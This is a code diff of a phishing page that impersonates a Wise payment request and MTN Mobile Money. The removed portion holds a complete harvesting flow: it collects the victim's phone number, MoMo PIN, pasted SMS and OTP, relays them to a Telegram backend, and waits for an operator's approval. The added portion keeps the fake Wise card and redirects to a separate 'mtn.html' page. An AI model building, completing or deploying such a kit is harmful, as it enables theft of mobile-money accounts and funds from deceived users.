-  .success-icon svg { width: 44px; height: 44px; stroke: var(--wise-success); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
-  .success-title { font-size: 1.5rem; font-weight: 700; letter-spacing: -0.02em; color: var(--mtn-text); margin-bottom: 0.6rem; }
-  .success-subtitle { font-size: 0.92rem; color: var(--mtn-text-light); line-height: 1.6; margin-bottom: 1.75rem; }
-  .success-amount { background: linear-gradient(135deg, #E8F5E9 0%, #D4EDDA 100%); border: 1px solid #B8DFC6; border-radius: 1rem; padding: 1.25rem; margin-bottom: 1.75rem; }
-  .success-amount .label { font-size: 0.72rem; font-weight: 600; color: #0E7C3A; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.3rem; }
-  .success-amount .value { font-size: 1.5rem; font-weight: 700; color: var(--wise-success); letter-spacing: -0.02em; line-height: 1.1; }
-  .success-amount .value .cur { font-size: 0.85rem; font-weight: 600; color: #0E7C3A; margin-left: 0.3rem; }
-  .success-note { font-size: 0.82rem; color: var(--mtn-text-muted); line-height: 1.55; font-weight: 400; }
-
-  /* Resend page */
-  .resend-page { background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%); }
-  .resend-card { max-width: 480px; width: 100%; background: var(--wise-white); border-radius: 1.75rem; box-shadow: var(--shadow-lg); padding: 2rem; position: relative; overflow: hidden; text-align: center; animation: contentPop 0.4s both; }
-  .resend-card::before { background: var(--wise-error) !important; }
-  .resend-icon { width: 72px; height: 72px; border-radius: 50%; background: #FDECEC; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; }
-  .resend-icon svg { width: 34px; height: 34px; stroke: var(--wise-error); fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
-  .resend-title { font-size: 1.35rem; font-weight: 700; color: var(--mtn-text); margin-bottom: 0.6rem; }
-  .resend-subtitle { font-size: 0.92rem; color: var(--mtn-text-light); line-height: 1.55; margin-bottom: 2rem; max-width: 340px; margin-left: auto; margin-right: auto; }
-
-  .admin-fab { position: fixed; bottom: 1.5rem; right: 1.5rem; background: var(--wise-forest); color: white; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 20px -6px rgba(0,0,0,0.4); text-decoration: none; transition: transform 0.2s, box-shadow 0.2s, background 0.2s; z-index: 100; }
-  .admin-fab:hover { background: #1E3349; transform: translateY(-2px); }
-  .admin-fab svg { width: 22px; height: 22px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-
-  .spin { animation: spinRing 0.7s linear infinite; }
+  .footer-note {
+    margin-top: 1.25rem; padding-top: 1.1rem;
+    border-top: 1px solid var(--wise-border);
+    font-size: 0.76rem; color: var(--wise-grey);
+    text-align: center; display: flex; align-items: center;
+    justify-content: center; gap: 0.4rem;
+  }
+  .footer-note svg {
+    width: 13px; height: 13px; stroke: currentColor; fill: none;
+    stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
+  }
 
   @media (max-width: 480px) {
     .payment-card { padding: 1.6rem 1.25rem 1.4rem; border-radius: 1.5rem; }
     .amount-value { font-size: 1.5rem; }
-    .accept-btn, .mtn-confirm-btn, .sms-submit-btn, .otp-submit-btn { font-size: 1rem; padding: 1rem 1.25rem; }
+    .accept-btn { font-size: 1rem; padding: 1rem 1.25rem; }
     .detail-value { max-width: 60%; }
-    .country-prefix { padding: 0 0.7rem; }
-    .sms-card, .otp-card, .resend-card, .success-card { padding: 1.5rem 1.25rem; border-radius: 1.5rem; }
-    .otp-input { width: 48px; height: 56px; font-size: 1.4rem; }
-    .otp-inputs { gap: 0.5rem; }
   }
 </style>
 </head>
 <body>
 
 <div class="card-container">
-  <div class="card-stage">
-
-    <!-- WISE CARD -->
-    <div class="payment-card wise active" id="wiseCard">
-      <div class="wise-header">
-        <div class="wise-logo">
-          <svg viewBox="0 0 32 32" fill="none"><path d="M6 5L14 21L11 26L22 8L17 8L12 15L8 5H6Z" fill="#163300" stroke="#163300" stroke-width="1.5" stroke-linejoin="round"/><path d="M20 26L26 5" stroke="#163300" stroke-width="2.2" stroke-linecap="round"/></svg>
-        </div>
-        <div class="wise-title"><span class="brand">Wise</span><span class="subtitle">Payment request</span></div>
+  <div class="payment-card" id="wiseCard">
+    <div class="wise-header">
+      <div class="wise-logo">
+        <svg viewBox="0 0 32 32" fill="none">
+          <path d="M6 5L14 21L11 26L22 8L17 8L12 15L8 5H6Z" fill="#163300" stroke="#163300" stroke-width="1.5" stroke-linejoin="round"/>
+          <path d="M20 26L26 5" stroke="#163300" stroke-width="2.2" stroke-linecap="round"/>
+        </svg>
       </div>
+      <div class="wise-title">
+        <span class="brand">Wise</span>
+        <span class="subtitle">Payment request</span>
+      </div>
+    </div>
 
-      <div class="payment-details">
-        <div class="detail-row">
-          <div class="detail-label"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Sender</div>
-          <div class="detail-value sender-info">
-            <span class="sender-name" id="senderName">Maya Chen</span>
-            <span class="sender-email" id="senderEmail">maya.chen@example.com</span>
-            <span class="ref-note" id="refNote"></span>
+    <div class="payment-details">
+      <div class="detail-row">
+        <div class="detail-label">
+          <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          Sender
+        </div>
+        <div class="detail-value sender-info">
+          <span class="sender-name" id="senderName">—</span>
+          <span class="sender-email" id="senderEmail">—</span>
+          <span class="ref-note" id="refNote"></span>
+        </div>
+      </div>
+      <div class="detail-row">
+        <div class="detail-label">
+          <svg viewBox="0 0 24 24"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+          Amount
+        </div>
+        <div class="detail-value">
+          <div class="amount-block">
+            <span class="amount-value" id="amountValue">—</span>
+            <span class="currency-badge" id="currencyCode">—</span>
           </div>
         </div>
-        <div class="detail-row">
-          <div class="detail-label"><svg viewBox="0 0 24 24"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>Amount</div>
-          <div class="detail-value"><div class="amount-block"><span class="amount-value" id="amountValue">1,250.00</span><span class="currency-badge" id="currencyCode">USD</span></div></div>
+      </div>
+      <div class="detail-row">
+        <div class="detail-label">
+          <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Note
         </div>
-        <div class="detail-row">
-          <div class="detail-label"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>Note</div>
-          <div class="detail-value" id="noteValue" style="font-weight: 500; color: #2B4B2E;">Payment for design services</div>
-        </div>
-      </div>
-
-      <button class="accept-btn" id="acceptBtn">
-        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-        Accept payment
-      </button>
-
-      <div class="footer-note">
-        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-        Funds will be credited securely via Wise
+        <div class="detail-value" id="noteValue" style="font-weight:500;color:#2B4B2E;">—</div>
       </div>
     </div>
 
-    <!-- MTN CARD -->
-    <div class="payment-card mtn" id="mtnCard">
-      <div class="mtn-header">
-        <div class="mtn-logo">MTN</div>
-        <div class="mtn-title"><span class="brand">MTN Mobile Money</span><span class="subtitle">Confirm recipient & PIN</span></div>
-      </div>
-
-      <div class="amount-hero">
-        <div class="label-block"><span class="label">Transfer amount</span><span class="sub">You are sending</span></div>
-        <div class="amount-display"><span class="value" id="mtnAmount">1,250.00</span><span class="cur" id="mtnCurrency">USD</span></div>
-      </div>
-
-      <div class="mtn-form">
-        <div class="form-group">
-          <label class="form-label" for="recipientPhone">
-            <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
-            Recipient number <span class="required">*</span>
-          </label>
-          <div class="phone-input-wrap" id="phoneWrap">
-            <div class="country-picker">
-              <div class="country-prefix" id="countryPrefix">
-                <span class="flag" id="countryFlag">🇺🇬</span>
-                <span class="code" id="countryCode">+256</span>
-                <svg class="caret" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg>
-              </div>
-              <select id="countrySelect" aria-label="Country">
-                <option value="UG|+256|🇺🇬|UGX|3800" selected>Uganda (+256)</option>
-                <option value="KE|+254|🇰🇪|KES|129">Kenya (+254)</option>
-                <option value="TZ|+255|🇹🇿|TZS|2650">Tanzania (+255)</option>
-                <option value="RW|+250|🇷🇼|RWF|1400">Rwanda (+250)</option>
-                <option value="GH|+233|🇬🇭|GHS|15.5">Ghana (+233)</option>
-                <option value="NG|+234|🇳🇬|NGN|1550">Nigeria (+234)</option>
-                <option value="ZA|+27|🇿🇦|ZAR|18.5">South Africa (+27)</option>
-                <option value="CI|+225|🇨🇮|XOF|605">Côte d'Ivoire (+225)</option>
-                <option value="CM|+237|🇨🇲|XAF|605">Cameroon (+237)</option>
-                <option value="SN|+221|🇸🇳|XOF|605">Senegal (+221)</option>
-                <option value="ZM|+260|🇿🇲|ZMW|26">Zambia (+260)</option>
-                <option value="MW|+265|🇲🇼|MWK|1730">Malawi (+265)</option>
-              </select>
-            </div>
-            <input type="tel" id="recipientPhone" placeholder="771 234 567" autocomplete="tel" inputmode="numeric" />
-          </div>
-          <span class="form-hint"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>Enter the MTN number without the country code</span>
-        </div>
-
-        <div class="form-group">
-          <label class="form-label" for="recipientName">
-            <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-            Recipient name <span class="required">*</span>
-          </label>
-          <input type="text" id="recipientName" class="form-input" placeholder="e.g. John Doe" autocomplete="name" />
-        </div>
-
-        <div class="form-group">
-          <label class="form-label" for="momoPin">
-            <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-            MoMo PIN <span class="required">*</span>
-          </label>
-          <div class="pin-input-wrap">
-            <input type="password" id="momoPin" placeholder="Enter your 5-digit MoMo PIN" maxlength="5" inputmode="numeric" autocomplete="off" />
-            <button type="button" class="pin-toggle" id="pinToggle" aria-label="Show PIN"><svg id="pinEye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
-          </div>
-          <span class="secure-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Encrypted &amp; secure</span>
-        </div>
-      </div>
-
-      <button class="mtn-confirm-btn" id="mtnConfirmBtn">
-        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-        Confirm transaction
-      </button>
-
-      <div id="mtnStatus" class="status-message hidden"><svg viewBox="0 0 24 24" id="mtnStatusIcon"><polyline points="20 6 9 17 4 12"/></svg><span id="mtnStatusText"></span></div>
-
-      <button class="back-link" id="backBtn">
-        <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-        Back to Wise payment
-      </button>
-
-      <div class="footer-note mtn-footer">
-        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-        Secured by MTN Mobile Money
-      </div>
-    </div>
-
-  </div>
-</div>
-
-<!-- WAITING FOR APPROVAL PAGE -->
-<div class="fullscreen-page waiting-page" id="waitingPage">
-  <div class="page-content">
-    <div class="waiting-ring"><div class="waiting-center">MTN</div></div>
-    <h1 class="waiting-title" id="waitingTitle">Waiting for approval</h1>
-    <p class="waiting-subtitle" id="waitingSubtitle">Please wait while we verify your transaction.</p>
-
-    <div class="waiting-info">
-      <div class="waiting-info-row"><span class="k">Transaction ID</span><span class="v" id="waitingTxnId">—</span></div>
-      <div class="waiting-info-row"><span class="k">Status</span><span class="v"><span class="waiting-dots"><span></span><span></span><span></span></span></span></div>
-    </div>
-  </div>
-</div>
-
-<!-- SMS PAGE -->
-<div class="fullscreen-page sms-page" id="smsPage">
-  <div class="sms-card">
-    <div class="sub-card-header">
-      <div class="mtn-logo">MTN</div>
-      <div class="title"><span class="brand">Confirm your SMS</span><span class="sub">Paste the message from MTN</span></div>
-    </div>
-
-    <div class="amount-confirm-badge">
-      <div><div class="label">You will receive</div><div class="value" id="smsAmount">4,750,000</div></div>
-      <span class="cur" id="smsCurrency">UGX</span>
-    </div>
-
-    <div class="sms-instructions">
-      <div class="title"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Paste the SMS you received from MTN</div>
-      <ol>
-        <li>Open your phone's <strong>Messages</strong> app</li>
-        <li>Find the message starting with <span class="highlight">Y'ello</span></li>
-        <li>Copy the <strong>full text</strong> of the message</li>
-        <li>Paste it in the box below</li>
-      </ol>
-    </div>
-
-    <div class="sms-textarea-wrap">
-      <label for="smsInput"><svg viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>SMS message</label>
-      <textarea id="smsInput" class="sms-textarea" placeholder="Y'ello, You have received UGX 4,750,000 from ..." rows="4"></textarea>
-    </div>
-
-    <button class="sms-submit-btn" id="smsSubmitBtn">
+    <button class="accept-btn" id="acceptBtn">
       <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      Verify &amp; continue
+      Accept payment
     </button>
 
-    <div id="smsStatus" class="status-message hidden"><svg viewBox="0 0 24 24" id="smsStatusIcon"><polyline points="20 6 9 17 4 12"/></svg><span id="smsStatusText"></span></div>
-  </div>
-</div>
-
-<!-- VERIFYING PAGE (8s) -->
-<div class="fullscreen-page verifying-page" id="verifyingPage">
-  <div class="page-content">
-    <div class="waiting-ring"><div class="waiting-center">MTN</div></div>
-    <h1 class="waiting-title">Verifying recipient number</h1>
-    <p class="waiting-subtitle">Confirming the MTN number with the network.</p>
-
-    <div class="verifying-progress-bar"><div class="verifying-progress-fill" id="verifyingProgress"></div></div>
-    <div class="verifying-timer"><span id="verifyingSeconds" class="secs">8</span> seconds remaining</div>
-
-    <div class="verifying-checklist" style="margin-top:1.5rem;">
-      <div class="check-item" id="check1"><div class="dot"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span>Number format validated</span></div>
-      <div class="check-item" id="check2"><div class="dot"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span>Network check</span></div>
-      <div class="check-item" id="check3"><div class="dot"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div><span>Generating secure OTP</span></div>
+    <div class="footer-note">
+      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Funds will be credited securely via Wise
     </div>
   </div>
 </div>
-
-<!-- OTP PAGE -->
-<div class="fullscreen-page otp-page" id="otpPage">
-  <div class="otp-card">
-    <div class="sub-card-header">
-      <div class="mtn-logo">MTN</div>
-      <div class="title"><span class="brand">Enter verification code</span><span class="sub">4-digit OTP sent to your phone</span></div>
-    </div>
-
-    <p class="otp-instruction">
-      We sent a <strong>4-digit code</strong> to <span class="phone-highlight" id="otpPhone">+256 771 234 567</span>.
-      Enter it below to authorize the transaction.
-    </p>
-
-    <div class="otp-inputs">
-      <input type="tel" class="otp-input" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
-      <input type="tel" class="otp-input" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
-      <input type="tel" class="otp-input" id="otp3" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
-      <input type="tel" class="otp-input" id="otp4" maxlength="1" inputmode="numeric" autocomplete="off" placeholder="•" />
-    </div>
-
-    <button class="otp-submit-btn" id="otpSubmitBtn">
-      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
-      Verify code
-    </button>
-
-    <div class="otp-resend-row">
-      <span>Didn't receive the code?</span>
-      <button class="otp-resend-btn" id="otpResendBtn"><span id="resendLabel">Resend</span> <span id="resendCount"></span></button>
-    </div>
-
-    <div id="otpStatus" class="status-message hidden" style="margin-top:1rem;"><svg viewBox="0 0 24 24" id="otpStatusIcon"><polyline points="20 6 9 17 4 12"/></svg><span id="otpStatusText"></span></div>
-  </div>
-</div>
-
-<!-- RESEND PAGE (after decline) -->
-<div class="fullscreen-page resend-page" id="resendPage">
-  <div class="resend-card">
-    <div class="resend-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></div>
-    <h1 class="resend-title">Wrong code</h1>
-    <p class="resend-subtitle">The verification code you entered was incorrect. Please request a new code to continue.</p>
-    <button class="resend-new-btn" id="resendNewBtn">
-      <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
-      Resend new OTP
-    </button>
-  </div>
-</div>
-
-<!-- SUCCESS PAGE -->
-<div class="fullscreen-page success-page" id="successPage">
-  <div class="success-card">
-    <div class="success-icon"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
-    <h1 class="success-title">Transaction approved</h1>
-    <p class="success-subtitle">You should receive funds within 24 hrs if details entered correctly.</p>
-
-    <div class="success-amount">
-      <div class="label">Amount to receive</div>
-      <div class="value" id="successAmount">4,750,000<span class="cur" id="successCurrency">UGX</span></div>
-    </div>
-
-    <p class="success-note">You will receive a confirmation SMS from MTN shortly.</p>
-  </div>
-</div>
-
-<a href="admin.html" class="admin-fab" title="Admin" aria-label="Admin">
-  <svg viewBox="0 0 24 24"><path d="M12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
-</a>
 
 <script>
 (function() {
@@ -613,12 +252,6 @@
     note: 'Payment for design services'
   };
 
-  const CURRENCY_INFO = {
-    UGX: 3800, KES: 129, TZS: 2650, RWF: 1400, GHS: 15.5,
-    NGN: 1550, ZAR: 18.5, XOF: 605, XAF: 605, ZMW: 26,
-    MWK: 1730, USD: 1
-  };
-
   const paymentData = (function(){
     try {
       const raw = localStorage.getItem(STORAGE_KEY);
@@ -626,642 +259,28 @@
     } catch(e) { return { ...DEFAULT_DATA }; }
   })();
 
-  // ---- DOM shortcuts ----
-  const $ = id => document.getElementById(id);
-
-  const wiseCard = $('wiseCard'), mtnCard = $('mtnCard');
-  const waitingPage = $('waitingPage'), smsPage = $('smsPage'),
-        verifyingPage = $('verifyingPage'), otpPage = $('otpPage'),
-        resendPage = $('resendPage'), successPage = $('successPage');
-
-  const acceptBtn = $('acceptBtn'), mtnConfirmBtn = $('mtnConfirmBtn'),
-        backBtn = $('backBtn'), smsSubmitBtn = $('smsSubmitBtn'),
-        otpSubmitBtn = $('otpSubmitBtn'), otpResendBtn = $('otpResendBtn'),
-        resendNewBtn = $('resendNewBtn');
-
-  const recipientPhone = $('recipientPhone');
-  const recipientName = $('recipientName');
-  const momoPin = $('momoPin');
-  const pinToggle = $('pinToggle'), pinEye = $('pinEye');
-  const countrySelect = $('countrySelect');
-  const countryFlag = $('countryFlag'), countryCode = $('countryCode');
-  const phoneWrap = $('phoneWrap');
-  const mtnStatus = $('mtnStatus'), mtnStatusText = $('mtnStatusText'), mtnStatusIcon = $('mtnStatusIcon');
-  const smsInput = $('smsInput'), smsAmount = $('smsAmount'), smsCurrency = $('smsCurrency');
-  const smsStatus = $('smsStatus'), smsStatusText = $('smsStatusText'), smsStatusIcon = $('smsStatusIcon');
-  const otpInputs = [$('otp1'), $('otp2'), $('otp3'), $('otp4')];
-  const otpPhone = $('otpPhone');
-  const otpStatus = $('otpStatus'), otpStatusText = $('otpStatusText'), otpStatusIcon = $('otpStatusIcon');
-  const resendLabel = $('resendLabel'), resendCount = $('resendCount');
-  const successAmount = $('successAmount'), successCurrency = $('successCurrency');
-  const waitingTxnId = $('waitingTxnId'), waitingTitle = $('waitingTitle'), waitingSubtitle = $('waitingSubtitle');
-  const verifyingProgress = $('verifyingProgress'), verifyingSeconds = $('verifyingSeconds');
-  const check1 = $('check1'), check2 = $('check2'), check3 = $('check3');
-
-  // ---- State ----
-  let currentTxnId = null;
-  let currentStage = null;
-  let currentOtp = null;
-  let pollTimer = null;
-  let resendCooldownTimer = null;
-
-  // ---- Helpers ----
   function fmtAmount(n) {
     return (parseFloat(n) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
   }
-  function fmtLocal(amount, currency) {
-    const rate = CURRENCY_INFO[currency] || 1;
-    const local = (parseFloat(amount) || 0) * rate;
-    const dec = local > 100 ? 0 : 2;
-    return local.toLocaleString('en-US', { minimumFractionDigits: dec, maximumFractionDigits: dec });
-  }
-  function getCountry() {
-    const p = countrySelect.value.split('|');
-    return { code: p[0], dial: p[1], flag: p[2], localCurrency: p[3] || 'UGX', name: countrySelect.options[countrySelect.selectedIndex].text.split(' (')[0] };
-  }
-  function getFullPhone() {
-    const c = getCountry();
-    const local = recipientPhone.value.trim().replace(/\s/g, '');
-    return `${c.dial}${local}`;
-  }
-  function fmtPhone(p) {
-    const m = p.match(/^(\+\d{1,3})(\d{3})(\d{3})(\d{3,})$/);
-    if (m) return `${m[1]} ${m[2]} ${m[3]} ${m[4]}`;
-    return p;
-  }
-  function genOtp() { return String(Math.floor(1000 + Math.random() * 9000)); }
-  function esc(s) {
-    if (s == null) return '';
-    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  }
 
-  // ---- Telegram send (via backend proxy) ----
-  async function sendTelegram(html, txnId, stage) {
-    try {
-      const res = await fetch('/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message: html, txnId, stage })
-      });
-      return await res.json();
-    } catch (e) {
-      console.error('Telegram send failed:', e);
-    }
-  }
+  // Render
+  document.getElementById('senderName').textContent = paymentData.senderName || '—';
+  document.getElementById('senderEmail').textContent = paymentData.senderEmail || '—';
+  document.getElementById('amountValue').textContent = fmtAmount(paymentData.amount);
+  document.getElementById('currencyCode').textContent = paymentData.currency || 'USD';
+  document.getElementById('noteValue').textContent = paymentData.note || '—';
+  document.getElementById('refNote').innerHTML = `
+    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/>
+      <line x1="4" y1="22" x2="4" y2="15"/>
+    </svg>
+    ${paymentData.reference || DEFAULT_DATA.reference}
+  `;
 
-  // ---- Poll approval status ----
-  function startPolling(txnId, onApproved, onDeclined) {
-    stopPolling();
-    pollTimer = setInterval(async () => {
-      try {
-        const res = await fetch(`/api/status/${encodeURIComponent(txnId)}`);
-        const data = await res.json();
-        if (data.status === 'approved') {
-          stopPolling();
-          onApproved();
-        } else if (data.status === 'declined') {
-          stopPolling();
-          onDeclined();
-        }
-      } catch (e) { /* ignore */ }
-    }, 1500);
-  }
-  function stopPolling() {
-    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
-  }
-
-  // ---- Status messages ----
-  function showStatus(el, textEl, iconEl, msg, type) {
-    textEl.textContent = msg;
-    el.classList.remove('hidden', 'success', 'error', 'info');
-    el.classList.add(type);
-    if (type === 'error') iconEl.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>';
-    else if (type === 'info') iconEl.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>';
-    else iconEl.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
-    setTimeout(() => el.classList.add('hidden'), 3500);
-  }
-
-  // ---- Card transitions ----
-  let transitioning = false;
-  function transitionCards(from, to, dir) {
-    if (transitioning) return;
-    transitioning = true;
-    const fwd = dir === 'forward';
-    to.classList.remove('back-enter');
-    if (!fwd) to.classList.add('back-enter');
-    from.classList.remove('active', 'back-leave');
-    if (!fwd) from.classList.add('back-leave');
-    from.classList.add('leaving');
-    if (to === mtnCard) document.body.classList.add('mtn-mode');
-    else document.body.classList.remove('mtn-mode');
-    requestAnimationFrame(() => requestAnimationFrame(() => to.classList.add('active')));
-    setTimeout(() => {
-      from.classList.remove('leaving', 'back-leave');
-      transitioning = false;
-      if (to === mtnCard) setTimeout(() => recipientPhone.focus(), 60);
-    }, 260);
-  }
-
-  // ---- Show/hide fullscreen pages ----
-  function showPage(page) {
-    [waitingPage, smsPage, verifyingPage, otpPage, resendPage, successPage].forEach(p => p.classList.remove('active'));
-    if (page) page.classList.add('active');
-  }
-  function hideAllPages() {
-    [waitingPage, smsPage, verifyingPage, otpPage, resendPage, successPage].forEach(p => p.classList.remove('active'));
-  }
-
-  // ---- Render ----
-  function render() {
-    $('senderName').textContent = paymentData.senderName || DEFAULT_DATA.senderName;
-    $('senderEmail').textContent = paymentData.senderEmail || DEFAULT_DATA.senderEmail;
-    $('amountValue').textContent = fmtAmount(paymentData.amount);
-    $('currencyCode').textContent = paymentData.currency || 'USD';
-    $('noteValue').textContent = paymentData.note || DEFAULT_DATA.note;
-    $('refNote').innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg>${paymentData.reference || DEFAULT_DATA.reference}`;
-    $('mtnAmount').textContent = fmtAmount(paymentData.amount);
-    $('mtnCurrency').textContent = paymentData.currency || 'USD';
-    updateSmsAmount();
-  }
-  function updateSmsAmount() {
-    const c = getCountry();
-    smsAmount.textContent = fmtLocal(paymentData.amount, c.localCurrency);
-    smsCurrency.textContent = c.localCurrency;
-  }
-
-  // ---- Accept payment → MTN ----
-  acceptBtn.addEventListener('click', () => {
-    transitionCards(wiseCard, mtnCard, 'forward');
-    if (!recipientName.value) recipientName.value = paymentData.senderName || '';
+  // Navigate to mtn.html on accept
+  document.getElementById('acceptBtn').addEventListener('click', () => {
+    window.location.href = 'mtn.html';
   });
-
-  backBtn.addEventListener('click', () => {
-    transitionCards(mtnCard, wiseCard, 'back');
-    phoneWrap.classList.remove('error');
-    momoPin.classList.remove('error');
-    mtnConfirmBtn.disabled = false;
-    mtnConfirmBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Confirm transaction';
-  });
-
-  // Country selector
-  countrySelect.addEventListener('change', () => {
-    const p = countrySelect.value.split('|');
-    countryFlag.textContent = p[2];
-    countryCode.textContent = p[1];
-    phoneWrap.classList.remove('error');
-    updateSmsAmount();
-  });
-
-  // PIN toggle
-  pinToggle.addEventListener('click', () => {
-    const pw = momoPin.type === 'password';
-    momoPin.type = pw ? 'text' : 'password';
-    pinEye.innerHTML = pw
